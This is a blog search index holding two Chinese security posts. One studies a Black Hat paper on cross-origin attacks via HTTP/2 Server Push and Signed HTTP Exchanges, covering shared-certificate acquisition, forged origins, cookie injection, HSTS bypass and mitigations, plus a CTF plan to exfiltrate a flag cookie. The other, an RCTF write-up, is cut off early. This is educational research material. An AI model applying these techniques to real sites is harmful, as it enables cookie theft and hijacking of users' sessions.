<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>通过Server Push和SXG实现跨源web攻击的学习</title>
    <link href="/2025/12/16/%E9%80%9A%E8%BF%87Server%20Push%E5%92%8CSXG%E5%AE%9E%E7%8E%B0%E8%B7%A8%E6%BA%90web%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/12/16/%E9%80%9A%E8%BF%87Server%20Push%E5%92%8CSXG%E5%AE%9E%E7%8E%B0%E8%B7%A8%E6%BA%90web%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#前言" class="headerlink" title="前言"></a>前言</h1><p>本文来自清华大学的一项研究</p><p><a href="https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Chen-Cross-Origin-Web-Attacks-via-HTTP2-Server-Push-and-Signed-HTTP-Exchange-Thursday.pdf">https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Chen-Cross-Origin-Web-Attacks-via-HTTP2-Server-Push-and-Signed-HTTP-Exchange-Thursday.pdf</a></p><p>为了避免做重复机械的翻译工作，我会同时从一个水平一般的学习者的角度讲解我学到的东西，如有不当之处，务必指正</p><h1 id="SOP是什么"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#SOP是什么" class="headerlink" title="SOP是什么"></a>SOP是什么</h1><p><strong>SOP全称same-origin policy，翻译成中文就是同源策略</strong></p><p>SOP是web安全的基石，它被设计用于防护跨源攻击</p><p>那么什么是同源什么是跨源呢，要弄清这个问题，我们需要先知道源的定义：<strong>由协议、主机名、端口号三者确定的三元组</strong>，（e.g. {“https”,”a.com”,”443”}）只有这三部分完全相同时才叫做同源，很显然他是基于URI的（URI-based）</p><style>.bjcgqgdbeixv{zoom:50%;}</style><p>图中的a.com和b.com显然为不同源的两个站点，SOP就像一个隔板，将这两个网站隔开，如果用户通过浏览器从a.com向b.com的服务器发送请求，同源策略会拦截b服务器返回的数据，比如常见的xss，在跨站攻击的时候可以通过iframe从一个网站引入另一个网站的资源，如果不同源，就会被SOP拦截</p><h1 id="SAN是什么"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#SAN是什么" class="headerlink" title="SAN是什么"></a>SAN是什么</h1><p>SAN全称是<strong>Subject Alternative Name</strong>，翻译成中文是<strong>使用者备用名称</strong></p><p>在TLS&#x2F;SSL证书中，SAN的作用是解决单证书适配多域名的需求，在早期传统的证书中，存在一个CN字段，用于表示主域名，仅支持单域名，而SAN支持绑定多个域名，并且，除了域名，SAN还支持绑定IP，邮箱，URI</p><p><img src="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/image-20251216225329616.png" alt="image-20251216225329616"></p><p>这就是SAN字段可能包含的内容，与之相似的还有一个叫做通配符证书的东西，通配符证书也就是类似于*.example.com</p><p>它可以作用所有后缀为.example.com的子域名，显然灵活性远远不如SAN</p><p>HTTP&#x2F;2 和 HTTP&#x2F;3认为所有在证书的SAN里面的主域名是”同源“的，这里的同源和浏览器SOP认为的同源不完全一样</p><p>主要是视这些主机具有<strong>同一 TLS 权限</strong></p><h1 id="SAN-based-origin"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#SAN-based-origin" class="headerlink" title="SAN-based origin"></a>SAN-based origin</h1><p>显然和前面的URI-based origin相比，基于SAN的同源要求更松，也就意味着它的灵活性更好，96%的证书在SAN列表中有多个域名，甚至3.2%的证书还包含来自不同组织的域名</p><style>.mysyuqqryfeo{zoom:50%;}</style><h1 id="这种更为激进的“源”会给网络带来什么新的威胁？"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#这种更为激进的“源”会给网络带来什么新的威胁？" class="headerlink" title="这种更为激进的“源”会给网络带来什么新的威胁？"></a>这种更为激进的“源”会给网络带来什么新的威胁？</h1><p>在这之前，我们需要了解一些前置知识</p><h2 id="HTTP-2-Server-Push"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#HTTP-2-Server-Push" class="headerlink" title="HTTP&#x2F;2 Server Push"></a>HTTP&#x2F;2 Server Push</h2><p><img src="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/image-20251217181945138.png" alt="image-20251217181945138"></p><p>传统的没有Push的方式需要浏览器向服务器请求多次来获取所需的所有资源，这回浪费时间，影响用户体验。</p><p>而Push就是当用户请求了html之后，服务器就会直接把需要的资源比如css发到浏览器。</p><p>那么他是怎么实现的呢</p><h3 id="通过Nginx的实现"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#通过Nginx的实现" class="headerlink" title="通过Nginx的实现"></a>通过Nginx的实现</h3><p>配置文件<code>conf/conf.d/default.conf</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl http2;<br>    <span class="hljs-attribute">server_name</span>  localhost;<br><br>    <span class="hljs-attribute">ssl</span>                      <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">ssl_certificate</span>          /etc/nginx/certs/example.crt;<br>    <span class="hljs-attribute">ssl_certificate_key</span>      /etc/nginx/certs/example.key;<br><br>    <span class="hljs-attribute">ssl_session_timeout</span>  <span class="hljs-number">5m</span>;<br><br>    <span class="hljs-attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;<br>    <span class="hljs-attribute">ssl_protocols</span> SSLv3 TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;<br>    <span class="hljs-attribute">ssl_prefer_server_ciphers</span>   <span class="hljs-literal">on</span>;<br><br>    <span class="hljs-section">location</span> / &#123;<br>      <span class="hljs-attribute">root</span>   /usr/share/nginx/html;<br>      <span class="hljs-attribute">index</span>  index.html index.htm;<br>      <span class="hljs-attribute">http2_push</span> /style.css;<br>      <span class="hljs-attribute">http2_push</span> /example.png;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>关注最后两行的内容，它表明如果用户请求根目录，就会自动push style.css和example.png这两个文件</p><h3 id="通过Apache的实现"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#通过Apache的实现" class="headerlink" title="通过Apache的实现"></a>通过Apache的实现</h3><p>配置文件<code>httpd.conf</code>或者<code>.htaccess</code></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">&lt;FilesMatch <span class="hljs-string">&quot;\index.html$&quot;</span>&gt;<br>    <span class="hljs-keyword">Header</span> add <span class="hljs-keyword">Link</span> <span class="hljs-string">&quot;&lt;/styles.css&gt;; rel=preload; as=style&quot;</span><br>    <span class="hljs-keyword">Header</span> add <span class="hljs-keyword">Link</span> <span class="hljs-string">&quot;&lt;/example.png&gt;; rel=preload; as=image&quot;</span><br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><h3 id="通过后端实现"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#通过后端实现" class="headerlink" title="通过后端实现"></a>通过后端实现</h3><p>前面两种是通过代理的配置文件实现，略显繁琐</p><p>可以让后端应用返回一个HTTP回应的头信息<code>Link</code>命令，服务器看见这个命令，就会自动Push指定的文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Link: &lt;/styles.css&gt;; <span class="hljs-built_in">rel</span>=preload; <span class="hljs-keyword">as</span>=style, &lt;/example.png&gt;; <span class="hljs-built_in">rel</span>=preload; <span class="hljs-keyword">as</span>=image<br></code></pre></td></tr></table></figure><p>此时，再修改Nginx的配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">server &#123;<br>    listen 443 ssl http2;<br><br>    <span class="hljs-comment"># ...</span><br><br>    root /var/www/html;<br><br>    location = / &#123;<br>        proxy_pass http://upstream;<br>        http2_push_preload on;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="解决缓存问题"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#解决缓存问题" class="headerlink" title="解决缓存问题"></a>解决缓存问题</h3><p>因为浏览器是有缓存的，他会把css等文件缓存到本地，这时再重复推送显然很浪费带宽。Nginx官方提出的一种解决办法是仅当用户第一次访问的时候才Push，根据Cookie来判断用户是否是第一次访问，配置方法如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs lasso">server &#123;<br>    listen <span class="hljs-number">443</span> ssl http2 default_server;<br><br>    ssl_certificate ssl/certificate.pem;<br>    ssl_certificate_key ssl/key.pem;<br><br>    root /<span class="hljs-built_in">var</span>/www/html;<br>    http2_push_preload <span class="hljs-keyword">on</span>;<br><br>    location = /demo.html &#123;<br>        add_header <span class="hljs-built_in">Set</span><span class="hljs-params">-Cookie</span> <span class="hljs-string">&quot;session=1&quot;</span>;<br>        add_header <span class="hljs-keyword">Link</span> $resources;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-built_in">map</span> $http_cookie $resources &#123;<br>    <span class="hljs-string">&quot;~*session=1&quot;</span> <span class="hljs-string">&quot;&quot;</span>;<br>    default <span class="hljs-string">&quot;&lt;/style.css&gt;; as=style; rel=preload&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SXG"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#SXG" class="headerlink" title="SXG"></a>SXG</h2><p>SXG全称是<strong>Signed HTTP Exchange</strong></p><p>借助SXG，发布商可以对单个HTTP交换（即请求&#x2F;响应对）进行签名，这可让发布商安全地确保内容可移植（即可供其他方重新分发），同时保留内容的完整性和出处。</p><style>.elnjheqjjdie{zoom:50%;}</style><p>比如这里，a网站发布了一个内容，b网站作为一个服务商，可以让用户查看这个内容，在用户查看这个内容的时候，浏览器回加载这个Signed Exchange，它可以安全的在地址栏里面显示发布商的网址，也就是a.com。常见的场景是CDN。</p><p>如果想要不通过SXG来实现这个功能，则需要不同的网站共享TLS的密钥，这会带来一些安全问题。</p><style>.jpiebisxmxoi{zoom:50%;}</style><h2 id="共同点"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#共同点" class="headerlink" title="共同点"></a>共同点</h2><ul><li>他们都遵守SAN-based origin</li><li>他们都可以通过服务器的响应在共享的证书中表明(欺骗)他们的“源”（通过<code>:authority</code>伪标头和<code>request-url</code>签名标头）</li></ul><h2 id="影响"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#影响" class="headerlink" title="影响"></a>影响</h2><p>攻击者可以Push&#x2F;Provide资源到SAN列表中的其他站点，也就是CrossPush And CrossSXG 攻击</p><style>.dxvenpggytrt{zoom:50%;}</style><ol><li>获取一个与受害者网站共享的证书</li><li>引诱用户访问攻击者的网站</li><li>在攻击者服务器向用户Push内容时，因为与victim.com同在一个SAN列表中，所以他们拥有相同的TLS权限，攻击者可以通过伪造<code>:authority</code>来指向受害者的网站，攻击者也可以通过篡改 SXG 中的<code>request-url</code>和<code>validity-url</code>头部，虚假标注恶意内容的来源，指向victim.com</li><li>浏览器会接收到攻击者服务器Push的恶意脚本（比如XSS），将其视为来自同源的victim.com网站，并在访问victim.com时执行它</li></ol><p><strong>这使得路径外的攻击者借助共享证书发起可以实际落地的web攻击</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">tips:</span><br>路径内攻击者：处于受害者和目标服务器的网络传输路径中（比如中间路由器，代理节点），可以直接监听，篡改数据<br>路径外攻击者：不在这个传输路径中，无法直接监听和篡改数据，但可以借助其他漏洞发起攻击<br></code></pre></td></tr></table></figure><h2 id="攻击方式"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="借助HTTP-body"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#借助HTTP-body" class="headerlink" title="借助HTTP body"></a>借助HTTP body</h3><h4 id="通用的XSS"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#通用的XSS" class="headerlink" title="通用的XSS"></a>通用的XSS</h4><p>有一篇博客很好的讲解了这个过程： <a href="https://tttang.com/archive/1703/">https://tttang.com/archive/1703/</a></p><style>.lfdqtpuemgbv{zoom:50%;}</style><p>即使有CSP，也无法阻止这样的攻击</p><h4 id="操纵Cookie"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#操纵Cookie" class="headerlink" title="操纵Cookie"></a>操纵Cookie</h4><p><img src="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/image-20251218101150976.png" alt="image-20251218101150976"></p><p><strong>原理</strong>：</p><p>​在HTTP&#x2F;2协议中，TLS权限的主体是按照SAN列表来定的，证书里的所有域名都是同一权限，而浏览器的同源策略是按照URI的域名来判定的，这就导致了差异，如果攻击者服务器与victim.com同在一个SAN列表中，攻击者服务器在设置<code>domain=victim.com</code>时，HTTP&#x2F;2会认为这是合法的，从而导致浏览器认为这个设置也是合法的，于是允许了这次Set-Cookie</p><h4 id="绕过HSTS"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#绕过HSTS" class="headerlink" title="绕过HSTS"></a>绕过HSTS</h4><p>**HSTS：**HTTP Strict Transport Security，即HTTP严格传输安全，也就是强制浏览器仅通过HTTPS与服务器进行通信</p><style>.lrddxfhnypjt{zoom:50%;}</style><p>利用共享的证书，攻击者可以通过设置max-age&#x3D;0，并且让浏览器误以为这是victim.com自己发的，从而让HSTS失效</p><h4 id="恶意文件下载"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#恶意文件下载" class="headerlink" title="恶意文件下载"></a>恶意文件下载</h4><style>.btotvemgbfvt{zoom:50%;}</style><p>攻击者通过设置Conten-Disposition，attachment告诉浏览器这是一个附件，需要下载，同时利用共享的证书，让浏览器信任攻击者的服务器，下载了恶意的木马文件</p><h2 id="如何让这些攻击方式落地？"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#如何让这些攻击方式落地？" class="headerlink" title="如何让这些攻击方式落地？"></a>如何让这些攻击方式落地？</h2><p>要是实现这些攻击，考虑以下三个问题</p><ol><li>如何获得与受害者服务器共享的证书</li><li>如何让攻击持久化</li><li>如何绕过潜在的对策，比如证书撤销</li></ol><h3 id="获得与受害者服务器共享的证书"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#获得与受害者服务器共享的证书" class="headerlink" title="获得与受害者服务器共享的证书"></a>获得与受害者服务器共享的证书</h3><h4 id="利用一些缺陷"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#利用一些缺陷" class="headerlink" title="利用一些缺陷"></a>利用一些缺陷</h4><p><code>/.well-known</code>目录中不安全的文件上传</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/.well-known是HTTP协议中预定义的标准目录，用于存放网站对外提供的公共配置文件，其中./</span>well<span class="hljs-operator">-</span>known<span class="hljs-regexp">/acme-challenge/</span>是与证书签发强相关的路径，在签发证书时，如果使用“<span class="hljs-type">HTTP</span><span class="hljs-operator">-</span><span class="hljs-number">01</span> 挑战”验证域名所有权，<span class="hljs-type">CA会访问该路径下的特定文件，以此确认申请者对域名的控制权，验证通过后才会签发TLS证书</span><br>如果此目录未做严格的上传权限控制，攻击者可以上传<span class="hljs-type">CA要求的验证文件来伪造域名所有权的证明，非法申请包含目标域名的共享TLS证书</span><br></code></pre></td></tr></table></figure><p>域名所有权下未受保护的 <code>_acme-challenge</code>DNS 记录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">简单来说，就是在签发TLS证书的时候，CA机构需要确认申请者对域名的持有权，会要求进行验证，其中一种方式是“DNS-01”挑战，需要域名持有者在自己的<span class="hljs-built_in"> DNS </span>服务器中添加一条名为_acme-challenge.目标域名的 TXT 记录，记录值由 CA 提供。CA 会检查这条<span class="hljs-built_in"> DNS </span>记录是否存在且正确，以此确认 “申请者确实拥有该域名”，随后签发证书。如果_acme-challenge<span class="hljs-built_in"> DNS </span>记录处于未受保护状态，攻击者可以篡改记录，那么攻击者就可以伪造受害者的身份来申请证书，获得与受害者共享的证书<br></code></pre></td></tr></table></figure><p>邮件服务商在保护域名的管理邮箱地址时存在疏忽</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">域名注册时需要填写管理邮箱，如果攻击者掌控了这个邮箱，或者能拿到验证邮件，那么就可以掌控这个域名，申请证书<br></code></pre></td></tr></table></figure><p><strong>目前没有强制的措施能够保证域名的所有者和证书的所有者身份一致，那么攻击者是完全可以获取到共享的证书的</strong></p><h5 id="具体的获取方法"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#具体的获取方法" class="headerlink" title="具体的获取方法"></a>具体的获取方法</h5><p>方法一：倒卖域名</p><p>​攻击者可以申请一张包含多个域名的证书，然后把其中的某个域名卖给受害者</p><p>方法二：域名接管</p><p>​有一些域名可能曾经被注册过，但是过期后没有继续续费，但是他曾经申请的TLS证书还是有效的，如果该域名与一些重要的域名同在一个SAN列表中，攻击者就可以购买这个域名并对这些重要域名发起攻击</p><h3 id="延长攻击持续时间"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#延长攻击持续时间" class="headerlink" title="延长攻击持续时间"></a>延长攻击持续时间</h3><p>先介绍一下验证复用机制，在TLS生态中，CA为了简化验证流程，当用户首次通过DNS-01&#x2F;HTTP-01&#x2F;邮箱验证之后，CA会缓存这次验证结果，在一段有效期内，如果用户再次申请该域名的证书，无需重复进行验证，之间复用之前的缓存结果即可签发证书。攻击者先购买一个域名，在申请完证书之后就有了缓存，如果这个时候域名过期了，被受害者买去了，攻击者任然可以继续申请证书。</p><p>下图为不利用验证复用机制的情况下攻击可以持续的时间，在域名被买走之前攻击者申请了一个证书，攻击可以持续直到证书过期。</p><style>.kzvvaptwynkb{zoom:50%;}</style><p>而在利用验证复用的情况下，攻击持续时间会大大加长</p><style>.aitblxbvrjdx{zoom:50%;}</style><h3 id="绕过防御策略"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#绕过防御策略" class="headerlink" title="绕过防御策略"></a>绕过防御策略</h3><p>当受害者意识到攻击者获得了共享的证书时，肯定会想办法撤销证书。而这个证书包含了攻击者域名和受害者域名，想要撤销需要满足以下两点要求之一</p><ul><li>对证书上的所有域名执行并通过DOV认证（DOV：Domain-Validated Only，也就是对域名所有权进行严格的鉴定）</li><li>拥有私钥</li></ul><p>而受害者这两点要求都没办法满足，对于第一点，因为攻击者的域名也在证书上，显然受害者没法对其完成DOV认证；对于第二点，证书是攻击者签发的，私钥在攻击者那里，也没办法满足。</p><p>所以受害者无法撤销这样的共享证书</p><h1 id="大规模测试"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#大规模测试" class="headerlink" title="大规模测试"></a>大规模测试</h1><p>论文中，研究员们利用这个方法分别对客户端和服务端进行了真实的实验，验证了攻击的可行性，这部分省略，感兴趣的师傅可以查看原文</p><p><a href="https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Chen-Cross-Origin-Web-Attacks-via-HTTP2-Server-Push-and-Signed-HTTP-Exchange-Thursday.pdf">https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Chen-Cross-Origin-Web-Attacks-via-HTTP2-Server-Push-and-Signed-HTTP-Exchange-Thursday.pdf</a></p><h1 id="缓解攻击"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#缓解攻击" class="headerlink" title="缓解攻击"></a>缓解攻击</h1><h2 id="从浏览器供应商"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#从浏览器供应商" class="headerlink" title="从浏览器供应商"></a>从浏览器供应商</h2><p>在浏览器中强制执行一致的authority（IP）以缓解CrossPUSH</p><p>强制单域名证书来缓解CrossSXG</p><h2 id="从证书认证"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#从证书认证" class="headerlink" title="从证书认证"></a>从证书认证</h2><p>在 SAN 列表中的域名所有者提出请求时，协助其将自己的域名从共享证书中移除</p><h2 id="从用户"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#从用户" class="headerlink" title="从用户"></a>从用户</h2><p>在注册域名时检查证书状态</p><h1 id="CTF例题"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><h2 id="题目分析"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>SECCON CTF 14(2025) Quals–broken challenge</p><p>这题考察的是xss，只有一个bot，可以让bot访问可控的网站，访问方法如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">visit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`start: <span class="hljs-subst">$&#123;url&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>(&#123;<br>    <span class="hljs-attr">headless</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">executablePath</span>: <span class="hljs-string">&quot;/usr/bin/chromium&quot;</span>,<br>    <span class="hljs-attr">args</span>: [<br>      <span class="hljs-string">&quot;--no-sandbox&quot;</span>,<br>      <span class="hljs-string">&quot;--disable-dev-shm-usage&quot;</span>,<br>      <span class="hljs-string">&quot;--js-flags=--noexpose_wasm,--jitless&quot;</span>,<br>      <span class="hljs-string">&quot;--disable-features=HttpsFirstBalancedModeAutoEnable&quot;</span>,<br>    ],<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> context = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">createBrowserContext</span>();<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">await</span> context.<span class="hljs-title function_">setCookie</span>(&#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;FLAG&quot;</span>,<br>      <span class="hljs-attr">value</span>: flag.<span class="hljs-property">value</span>,<br>      <span class="hljs-attr">domain</span>: <span class="hljs-string">&quot;hack.the.planet.seccon&quot;</span>,<br>      <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>    &#125;);<br><br>    <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> context.<span class="hljs-title function_">newPage</span>();<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(url, &#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">3_000</span> &#125;);<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">5_000</span>);<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">close</span>();<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>  &#125;<br><br>  <span class="hljs-keyword">await</span> context.<span class="hljs-title function_">close</span>();<br>  <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`end: <span class="hljs-subst">$&#123;url&#125;</span>`</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>并且一个特定的自签名证书颁发机构 (cert.crt) 被安装在机器人的环境中，作为“受信任的根证书”。访问<code>/&#39;hint</code>可以获取私钥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/hint&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;hint&quot;</span>, &#123;<br>    <span class="hljs-attr">hint</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;./cert.key&quot;</span>), <br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>因为该域名根本不存在，所以没办法进行DNS解析</p><h2 id="思路"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#思路" class="headerlink" title="思路"></a>思路</h2><p>这题就可以利用前面提到的SXG，我们有了这个站点的证书，就可以利用起来伪造一个由hack.the.planet.seccon网站签发的SXG文件，内容是一个外带cookie的payload，然后让bot访问这个网页，浏览器会认为这个文件的发布者是hack.the.planet.seccon，于是就我们的外带的payload就可以读到cookie并发到我们的vps上，拿到flag</p><h1 id="感想"><a href="/2025/12/16/通过Server Push和SXG实现跨源web攻击的学习/#感想" class="headerlink" title="感想"></a>感想</h1><p>认认真真翻译一篇论文，遇到不懂的就去查，学到了非常多的东西，尽管零零散散的看，前前后后花了四五天，但是还是挺有意义的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCTF2025-photographer</title>
    <link href="/2025/12/15/RCTF2025-photographer/"/>
    <url>/2025/12/15/RCTF2025-photographer/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="/2025/12/15/RCTF2025-photographer/#前言" class="headerlink" title="前言"></a>前言</h1><p>虽然这道题被ai打烂了，但是复现的话还是认真分析一下整个流程</p><h1 id="解法"><a href="/2025/12/15/RCTF2025-photographer/#解法" class="headerlink" title="解法"></a>解法</h1><p>首先看一下在哪里获取flag             public\superadmin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/../app/config/autoload.php&#x27;</span>;<br><span class="hljs-title class_">Auth</span>::<span class="hljs-title function_ invoke__">init</span>();<br><span class="hljs-variable">$user_types</span> = <span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;user_types&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Auth</span>::<span class="hljs-title function_ invoke__">check</span>() &amp;&amp; <span class="hljs-title class_">Auth</span>::<span class="hljs-title function_ invoke__">type</span>() &lt; <span class="hljs-variable">$user_types</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>) ?: <span class="hljs-string">&#x27;RCTF&#123;test_flag&#125;&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span 